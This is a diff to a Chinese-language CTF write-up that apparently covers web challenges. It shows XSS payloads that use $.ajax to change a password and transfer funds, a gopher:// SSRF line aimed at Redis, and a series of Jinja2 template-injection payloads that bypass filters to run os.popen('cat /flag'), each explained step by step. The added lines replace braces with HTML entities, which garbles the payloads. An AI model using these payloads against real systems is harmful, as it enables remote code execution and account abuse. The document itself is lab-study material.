@@ -1561,7 +1561,7 @@ $('.laytable-cell-1-0-1').each(function(index,value){
 过程同上，区别就在更改了POST的传输方式
 
 ```bash
-<script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'123'}})</script>
+<script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'123'&#125;&#125;)</script>
 ```
 
 行了，直接通过
@@ -1577,7 +1577,7 @@ $('.laytable-cell-1-0-1').each(function(index,value){
 这个就是转账的包，可以根据这个转账写一个payload
 
 ```bash
-<script>$.ajax({url:'http://127.0.0.1/api/amount.php',type:'post',data:{u:'q',a:'9999'}})</script>
+<script>$.ajax({url:'http://127.0.0.1/api/amount.php',type:'post',data:{u:'q',a:'9999'&#125;&#125;)</script>
 ```
 
 之后直接购买就行了，如果不行就是靶场的问题，重新开一下靶场就行了
@@ -2467,7 +2467,7 @@ gopher://127.0.0.1:6379/_%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%
 用x代替就行了
 
 ```php
-?name={{x.__init__.__globals__[request.args.a].eval(request.args.b)}}&a=__builtins__&b=__import__('os').popen('cat /flag').read()
+?name=&#123;&#123;x.__init__.__globals__[request.args.a].eval(request.args.b)&#125;&#125;&a=__builtins__&b=__import__('os').popen('cat /flag').read()
 ```
 
 ## 364
@@ -2477,7 +2477,7 @@ gopher://127.0.0.1:6379/_%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%
 可以使用cookie的方式直接写进去
 
 ```php
-?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
+?name=&#123;&#123;x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)&#125;&#125;
 ```
 
 ```php
@@ -2497,7 +2497,7 @@ x1=__builtins__;x2=__import__('os').popen('cat /flag').read()
 至于shell的代码不能用"",直接cookie传参就行了
 
 ```php
-{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a)}}
+&#123;&#123;x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a)&#125;&#125;
 a tac /flag
 ```
 
@@ -2521,7 +2521,7 @@ attr("**base**") 的作用相当于\_\_base\_\_
 
 可以利用其他的语句
 
-<code>?name={{lipsum.__globals__.os.popen(request.values.a).read()}}&a =cat /flag</code>这里含有下划线的部分就是`lipsum.__globals__`这一部分
+<code>?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&a =cat /flag</code>这里含有下划线的部分就是`lipsum.__globals__`这一部分
 
 `(lipsum | attr(request.values.b))`
 
@@ -2532,7 +2532,7 @@ attr("**base**") 的作用相当于\_\_base\_\_
 通过利用get请求将含有下划线的通过b传入就可以绕过过滤，再通过attr的方式返回一个属性而不返回项目
 
 ```php
-?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
+?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&a=cat /flag&b=__globals__
 ```
 
 <code><font style="color:rgba(0, 0, 0, 0.85);">lipsum</font></code><font style="color:rgba(0, 0, 0, 0.85);">是一个 Python 模块（第三方库），每个模块在加载时会创建一个</font>**全局命名空间字典**<font style="color:rgba(0, 0, 0, 0.85);">（即</font><code><font style="color:rgba(0, 0, 0, 0.85);">模块名.__globals__</font></code><font style="color:rgba(0, 0, 0, 0.85);">），这个字典中存储了模块内定义 / 导入的所有变量、函数、类和模块引用。</font>
@@ -2548,16 +2548,16 @@ attr("**base**") 的作用相当于\_\_base\_\_
 但是感觉其实只要不过滤`request`就不需要担心，可以从`request`中获取
 
 ```php
-?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
+?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&a=__globals__&b=os&c=cat /flag
 ```
 
 我应该早点发现的，cookie方法被禁用了，所以一直拿不出数据来
 
 ## 368
 
-这一次过滤了请求了request，但是只限于再{{}}这个里面，就很神奇，使用{%%}就能绕过
+这一次过滤了请求了request，但是只限于再&#123;&#123;&#125;&#125;这个里面，就很神奇，使用&#123;%%&#125;就能绕过
 
-上一道题目的payload直接把{}换成{%%}就行了
+上一道题目的payload直接把{}换成&#123;%%&#125;就行了
 
 ## 369
 
@@ -2565,25 +2565,25 @@ attr("**base**") 的作用相当于\_\_base\_\_
 
 ```php
 ?name=
-{% set po=dict(po=a,p=a)|join%}
-{% set a=(()|select|string|list)|attr(po)(24)%}
-{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
-{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
-{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
-{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
-{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
-{% set chr=x.chr%}
-{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
-{%print(x.open(file).read())%}
+&#123;% set po=dict(po=a,p=a)|join%&#125;
+&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;
+&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;
+&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;
+&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;
+&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;
+&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;
+&#123;% set chr=x.chr%&#125;
+&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;
+&#123;%print(x.open(file).read())%&#125;
 ```
 
-#### <font style="color:rgb(0, 0, 0);">1.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set po=dict(po=a,p=a)|join%}`
+#### <font style="color:rgb(0, 0, 0);">1.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set po=dict(po=a,p=a)|join%&#125;`
 
 * `dict(po=a,p=a)`：创建字典`{'po': a, 'p': a}`（此时`a`尚未定义，值为`None`）。
 * `|join`：将字典的键拼接成字符串 → `'pop'`（字典`join`会拼接键，而非值）。
 * 最终`po = 'pop'`（后续用于调用`list.pop()`方法）。
 
-#### <font style="color:rgb(0, 0, 0);">2.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set a=(()|select|string|list)|attr(po)(24)%}`
+#### <font style="color:rgb(0, 0, 0);">2.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;`
 
 这一步是**获取字符**<code>**'_'**</code>，拆解：
 
@@ -2594,27 +2594,27 @@ attr("**base**") 的作用相当于\_\_base\_\_
 * `|attr(po)(24)`：`attr(po)`即`attr('pop')`，调用列表的`pop(24)`方法（取列表第 24 个元素并删除）。
   * 迭代器字符串的第 24 个字符通常是`'_'`（下划线），因此`a = '_'`。
 
-#### <font style="color:rgb(0, 0, 0);">3.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}`
+#### <font style="color:rgb(0, 0, 0);">3.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;`
 
 * `a='_'`，`dict(init=a)|join`拼接字典键得`'init'`。
 * 拼接结果：`'_' + '_' + 'init' + '_' + '_'` → `ini = '__init__'`（Python 对象的初始化方法名）。
 
-#### <font style="color:rgb(0, 0, 0);">4.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}`
+#### <font style="color:rgb(0, 0, 0);">4.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;`
 
 * `dict(globals=a)|join`拼接键得`'globals'`。
 * 拼接结果：`'__globals__'`（模块 / 函数的全局命名空间属性）。
 
-#### <font style="color:rgb(0, 0, 0);">5.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}`
+#### <font style="color:rgb(0, 0, 0);">5.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;`
 
 * `dict(getitem=a)|join`拼接键得`'getitem'`。
 * 拼接结果：`'__getitem__'`（Python 的索引访问魔法方法，等价于`[]`）。
 
-#### <font style="color:rgb(0, 0, 0);">6.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}`
+#### <font style="color:rgb(0, 0, 0);">6.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;`
 
 * `dict(builtins=a)|join`拼接键得`'builtins'`。
 * 拼接结果：`'__builtins__'`（Python 的内置模块，包含`open`、`eval`等函数）。
 
-#### <font style="color:rgb(0, 0, 0);">7.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}`
+#### <font style="color:rgb(0, 0, 0);">7.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;`
 
 这一步是**获取**<code>**__builtins__**</code>**模块**，拆解：
 
@@ -2625,16 +2625,16 @@ attr("**base**") 的作用相当于\_\_base\_\_
 * `(built)`：调用`__getitem__('__builtins__')` → 从全局字典中取出`__builtins__`模块。
 * 最终`x = __builtins__`（Python 内置对象集合）。
 
-#### <font style="color:rgb(0, 0, 0);">8.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set chr=x.chr%}`
+#### <font style="color:rgb(0, 0, 0);">8.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set chr=x.chr%&#125;`
 
 * `x.chr`即`__builtins__.chr` → 获取`chr()`函数（将 ASCII 码转为字符）。
 
-#### <font style="color:rgb(0, 0, 0);">9.</font><font style="color:rgb(0, 0, 0);"> </font>`{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}`
+#### <font style="color:rgb(0, 0, 0);">9.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;`
 
 * `chr(47)` → `'/'`，`chr(102)`→`'f'`，`chr(108)`→`'l'`，`chr(97)`→`'a'`，`chr(103)`→`'g'`。
 * `%2b`是 URL 编码的`+`（拼接字符串），最终`file = '/flag'`。
 
-#### <font style="color:rgb(0, 0, 0);">10.</font><font style="color:rgb(0, 0, 0);"> </font>`{%print(x.open(file).read())%}`
+#### <font style="color:rgb(0, 0, 0);">10.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;%print(x.open(file).read())%&#125;`
 
 * `x.open`即`__builtins__.open` → 打开文件`/flag`。
 * `.read()`读取文件内容并通过`print`输出 → 最终获取`/flag`的内容。
